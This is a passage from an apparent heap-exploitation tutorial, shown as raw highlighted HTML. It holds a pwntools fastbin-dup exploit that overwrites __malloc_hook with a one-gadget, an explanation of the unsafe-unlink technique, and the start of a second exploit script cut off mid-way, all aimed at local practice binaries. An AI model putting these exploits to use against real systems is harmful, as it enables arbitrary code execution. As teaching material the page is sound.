</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span><span class=lnt>95
</span><span class=lnt>96
</span><span class=lnt>97
</span><span class=lnt>98
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./fastbin_dup_2&#39;</span><span class=p>,</span><span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>libc</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>b *main
</span></span></span><span class=line><span class=cl><span class=s2>b *main+235
</span></span></span><span class=line><span class=cl><span class=s2>b *main+401
</span></span></span><span class=line><span class=cl><span class=s2>b *main+503
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>#b *main+298 b *main+473</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info</span><span class=p>(</span><span class=n>mes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>mes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>index</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;size: &#39;</span><span class=p>,</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>size</span><span class=si>}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;data: &#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>index</span> <span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=nb>id</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=nb>id</span><span class=si>}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1>#io.timeout = 0.1</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;puts() @ &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>puts_leak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>puts_leak</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;puts: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>puts_leak</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#===========================================================================================</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;&#34; 
</span></span></span><span class=line><span class=cl><span class=s2>Fake chunk in main arena to generate valide chunk size field
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chunk_A</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x48</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x48</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chunk_B</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x48</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;b&#39;</span><span class=o>*</span><span class=mh>0x48</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_A</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_B</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_A</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x48</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x61</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#request to 0x61 move to the head of fastbins(also it is in arena)</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x48</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;c&#39;</span><span class=o>*</span><span class=mh>0x48</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x48</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;d&#39;</span><span class=o>*</span><span class=mh>0x48</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>Link to main_arena to create fake chunk
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>dup_A</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x58</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;d&#39;</span><span class=o>*</span><span class=mh>0x48</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>dup_B</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x58</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;e&#39;</span><span class=o>*</span><span class=mh>0x48</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>dup_A</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>dup_B</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>dup_A</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Link to main_arena</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x58</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main_arena&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x20</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x58</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;-p</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#malloc(0x58, b&#39;f&#39;*0x58)</span>
</span></span><span class=line><span class=cl><span class=c1>#malloc(0x58, b&#39;g&#39;*0x58)</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x58</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;-s</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34; 
</span></span></span><span class=line><span class=cl><span class=s2>write to main_arena
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># byte \x00 ensure not ovewrite to other fastbins</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x58</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>48</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mi>35</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>19</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>+</span> <span class=mh>0xe1fa1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=unsafe-unlink>Unsafe unlink</h2><h3 id=overall-2>Overall</h3><p><img src=https://hackmd.io/_uploads/HJQPakuSC.png loading=lazy alt=image></p><ul><li><em><strong>During chunk consolidation</strong></em> the chunk already <em><strong>linked into a free list is unlinked from that list</strong></em> via the unlink macro. The unlinking process is a reflected <em><strong>WRITE</strong></em> using the <em><strong>chunk’s forward (fd) and backward (bk) pointers</strong></em><ul><li>The victim bk is copied over the bk of the chunk pointed to by the victim fd.</li><li>The victim fd is written over the fd of the chunk pointed to by the victim bk.</li><li>If a chunk with designer controlled fd & bk pointers is unlinked, this write can be manipulated.</li></ul></li><li>One way to achieve this is via an <em><strong>overflow into a chunk’s size field</strong></em>, which is used to <em><strong>CLEAR</strong></em> <em><strong>its prev_inuse bit</strong></em>. When the chunk with the clear prev_inuse bit is freed, malloc will attempt to <em><strong>consolidate it backwards</strong></em>. A designer-supplied prev_size field can aim this consolidation attempt at an allocated chunk where counterfeit fd & bk pointers reside.</li><li>For example<ul><li>Request chunks A & B, chunk A overflows into chunk B’s size field and chunk B is outside fastbin size range.</li><li>Prepare counterfeit fd & bk pointers within chunk A, the fd points at the free hook – 0x18 and the bk points to shellcode prepared elsewhere.</li><li>Prepare a prev_size field for chunk B that would cause a backward consolidation attempt to operate on the counterfeit fd & bk.</li><li>Leverage the overflow to clear chunk B’s prev_inuse bit.</li></ul></li><li>When chunk B is freed the <em><strong>clear prev_inuse bit</strong></em> in its size field causes malloc to <em><strong>read chunk B’s prev_size field and unlink the chunk that many bytes behind it</strong></em>. When the unlink macro operates on the counterfeit fd & bk pointers, it <strong>writes the address of the shellcode to the free hook and the address of the free hook – 0x18 into the 3rd quadword of the shellcode.</strong><ul><li>The shellcode can use a jump instruction to skip the bytes corrupted by the fd.</li></ul></li></ul><p><strong>Triggering a call to free() executes the shellcode.</strong></p><h3 id=approach-2>Approach</h3><ul><li>Force the unlink macro to process designer-controlled fd/bk pointers, leading to a reflected write.</li></ul><h3 id=further-use-2>Further use</h3><p>It is possible to use a <em><strong>prev_size field of 0</strong></em> and <em><strong>craft the counterfeit fd & bk pointers</strong></em> within chunk. The same technique can be applied to forward consolidation but requires stricter heap control.</p><h3 id=limitations-2>Limitations</h3><p>This technique can only be leveraged against <em><strong>GLIBC versions &lt;= 2.3.3</strong></em>, safe unlinking was introduced in GLIBC version 2.3.4 in 2004 and GLIBC versions that old are not common. This technique was originally leveraged against platforms without NX/DEP and is described as such here. In 2003 AMD introduced hardware NX support to their consumer desktop processors, followed by Intel in 2004, systems without this protection are not common.</p><h3 id=script-1>Script</h3><p>shell.py</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./unsafe_unlink&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;../.glibc/glibc_2.23_unsafe-unlink/libc.so.6&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#libc = elf.libc</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>b *main
</span></span></span><span class=line><span class=cl><span class=s2>b *main+265
</span></span></span><span class=line><span class=cl><span class=s2>b *main+382
</span></span></span><span class=line><span class=cl><span class=s2>b *main+656
</span></span></span><span class=line><span class=cl><span class=s2>b *main+717
</span></span></span><span class=line><span class=cl><span class=s2>b *main+787
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info</span><span class=p>(</span><span class=n>mes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>mes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>index</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;size: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>index</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;data: &#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1>#io.timeout = 0.1</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;puts() @ &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>puts</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;heap @ &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>puts</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;puts: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>puts</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc base: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;heap: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>heap</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chunk_a</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chunk_b</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fd_pointer</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=n>bk_pointer</span> <span class=o>=</span> <span class=n>heap</span> <span class=o>+</span> <span class=mh>0x20</span>
